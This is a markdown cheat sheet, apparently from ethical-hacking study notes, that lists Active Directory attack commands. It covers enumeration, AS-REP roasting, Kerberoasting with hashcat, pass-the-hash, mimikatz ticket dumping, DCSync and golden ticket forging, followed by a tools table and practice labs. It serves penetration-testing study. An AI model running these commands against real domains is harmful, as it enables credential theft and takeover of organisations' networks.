# 07 — Active Directory Attacks

## Key Concepts

| Term | Meaning |
|------|---------|
| DC | Domain Controller |
| AD | Active Directory |
| LDAP | Protocol for querying AD |
| Kerberos | Auth protocol used in AD |
| TGT | Ticket Granting Ticket |
| TGS | Ticket Granting Service |
| SPN | Service Principal Name |
| GPO | Group Policy Object |
| ACL/ACE | Access Control List / Entry |

---

## Enumeration (Unauthenticated)

```bash
# SMB null session
crackmapexec smb DC_IP
enum4linux -a DC_IP

# LDAP anonymous
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"

# Kerbrute — user enumeration
kerbrute userenum -d domain.local --dc DC_IP usernames.txt
```

## Enumeration (Authenticated)

```bash
# PowerView (Windows)
Get-NetDomain
Get-NetUser
Get-NetGroup "Domain Admins"
Get-NetComputer
Find-LocalAdminAccess
Invoke-ShareFinder

# BloodHound
SharpHound.exe -c all
bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all
```

## AS-REP Roasting

```bash
# No pre-auth required → get hash without password
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Crack
hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt
```

## Kerberoasting

```bash
# Get TGS for service accounts → crack offline
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# Crack
hashcat -a 0 -m 13100 kerberoast_hashes.txt rockyou.txt
```

## Pass-the-Hash

```bash
crackmapexec smb TARGET -u admin -H NTLM_HASH
psexec.py domain/admin@TARGET -hashes :NTLM_HASH
wmiexec.py domain/admin@TARGET -hashes :NTLM_HASH
```

## Pass-the-Ticket

```bash
# Dump tickets
mimikatz # sekurlsa::tickets /export

# Import ticket
mimikatz # kerberos::ptt ticket.kirbi

# Use
klist
```

## DCSync (Dump All Hashes)

```bash
# Requires replication rights (usually DA)
secretsdump.py domain/admin:password@DC_IP
mimikatz # lsadump::dcsync /domain:domain.local /all
```

## Golden Ticket

```bash
# Need: domain SID, krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-... /krbtgt:HASH /ptt
```

## Tools

| Tool | Use |
|------|-----|
| BloodHound + SharpHound | AD graph attack paths |
| Impacket suite | Remote exploitation |
| Mimikatz | Credential dumping |
| CrackMapExec | Swiss army knife |
| Kerbrute | User enum / brute |
| PowerView | AD enumeration (PS) |

## Practice

- [ ] TCM Security: "Practical Ethical Hacking" — AD section
- [ ] HackTheBox: Forest, Sauna, Active, Resolute
- [ ] TryHackMe: "Attacktive Directory"
